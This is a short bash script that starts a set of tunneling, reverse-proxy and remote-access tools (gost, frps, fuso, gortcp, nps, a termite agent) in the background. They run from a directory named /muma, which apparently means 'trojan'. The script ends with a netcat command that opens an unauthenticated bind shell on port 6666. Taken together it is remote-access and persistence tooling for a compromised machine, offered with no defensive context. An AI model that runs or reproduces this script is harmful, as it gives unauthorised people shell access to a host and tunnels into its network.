#! /bin/bash
nohup /muma/gost/gost -L=:8081 &
nohup /muma/frp/frps -c  /muma/frp/frps.ini &
nohup /muma/fuso/fus &
nohup /muma/gortcp/server &
nohup /muma/nps/nps &
nohup /muma/termite/agent  -l 8888 &
nc -lvvp 6666 -e /bin/sh &
